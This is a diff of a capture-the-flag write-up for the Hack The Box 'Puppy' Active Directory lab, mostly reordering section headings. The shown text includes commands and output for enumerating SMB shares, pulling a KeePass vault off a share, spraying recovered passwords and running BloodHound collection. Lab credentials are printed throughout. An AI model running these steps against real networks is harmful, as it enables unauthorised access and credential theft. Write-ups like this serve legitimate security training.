@@ -297,11 +297,12 @@ With the LDIF file prepared and saved as <code>modify-developers-group.ldif</cod
 modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"
 \`\`\`
 
+## 🔓 Exploring the DEV Share
+
 <p class="indent-paragraph">
 With Levi’s distinguished name successfully injected into the <code>DEVELOPERS</code> group, all that remained was to verify whether the new privileges took effect. For that, we used <code>netexec</code> and issued <code>nxc smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares</code>. The output confirmed that Levi now has <code>READ</code> access to the <code>DEV</code> share, previously inaccessible. The silent LDAP modification had done its job — Levi wasn’t just in the directory anymore; he was inside the developers' workspace.
 </p>
 
-## 🔓 Exploring the DEV Share
 
 \`\`\`
 ➜$ nxc smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares 
@@ -339,11 +340,11 @@ smb: \> get recovery.kdbx
 getting file \\recovery.kdbx of size 2677 as recovery.kdbx (4.6 KiloBytes/sec) (average 4.6 KiloBytes/sec)
 \`\`\`
 
+## 🔐 Cracking the KeePass Vault
+
 <p class="indent-paragraph">
 Once the <code>recovery.kdbx</code> file was in hand, the next step was to attempt its decryption using <code>keepassxc-cli</code>. However, running <code>keepassxc-cli open recovery.kdbx</code> immediately prompted for a password. Several attempts resulted in failure — the tool returned an <code>Invalid credentials</code> error, indicating that the database is protected by a master password that must now be recovered.
 </p>
-
-## 🔐 Cracking the KeePass Vault
 
 \`\`\`
 ➜$ keepassxc-cli open recovery.kdbx
@@ -374,11 +375,11 @@ The CLI hit a wall, but the GUI picked up where it left off. With the recovered 
 
 <img src="../../assets/htb/puppy/keepass_recovery-kdbx.png" class="full-width-img" alt="recovery.kdbx"/>
 
+## 🧪 Validating Credentials Across the Domain
+
 <p class="indent-paragraph">
 With a fresh batch of credentials in hand (usernames from our earlier RID brute-force enumeration and passwords extracted from the cracked KeePass database) it was time to test for valid logins. We passed both lists into <code>netexec</code> and issued <code>nxc smb dc.puppy.htb -u ../users-puppy-htb.txt -p ../pass-puppy-htb.txt</code>, letting it churn through possible combinations. The result? A clean hit: <span class="blue">PUPPY.HTB\ant.edwards:Antman2025!</span>. No domain admin logins, yet, but this set was definitely worth validating across the environment.
 </p>
-
-## 🧪 Validating Credentials Across the Domain
 
 \`\`\`
 ➜$ nxc smb dc.puppy.htb -u users-puppy-htb.txt -p pass-puppy-htb.txt | grep "[+]"
@@ -386,11 +387,12 @@ With a fresh batch of credentials in hand (usernames from our earlier RID brute-
 SMB               dc.puppy.htb     445    DC               [+] PUPPY.HTB\\ant.edwards:Antman2025! 
 \`\`\`
 
+## 🕵️‍♂️ BloodHound Enumeration & AD Mapping
+
 <p class="indent-paragraph">
 With valid domain credentials for <code>ant.edwards</code> in hand, we reran BloodHound to see what kind of access this new account could reveal. Using the command <code>bloodhound-python -u 'ant.edwards' -p 'Antman2025!' -dc dc.puppy.htb -d PUPPY.HTB -c All -ns 10.10.11.70 -o bloodhound_edwards.json</code>, we initiated a full collection cycle targeting the domain controller. The process completed successfully — and just like that, the map of Active Directory got a lot more interesting.
 </p>
 
-## 🕵️‍♂️ BloodHound Enumeration & AD Mapping
 
 \`\`\`
 ➜$ bloodhound-python -u 'ant.edwards' -p 'Antman2025!' -dc dc.puppy.htb -d PUPPY.HTB -c All -ns <IP> -o bloodhound_edwards.json
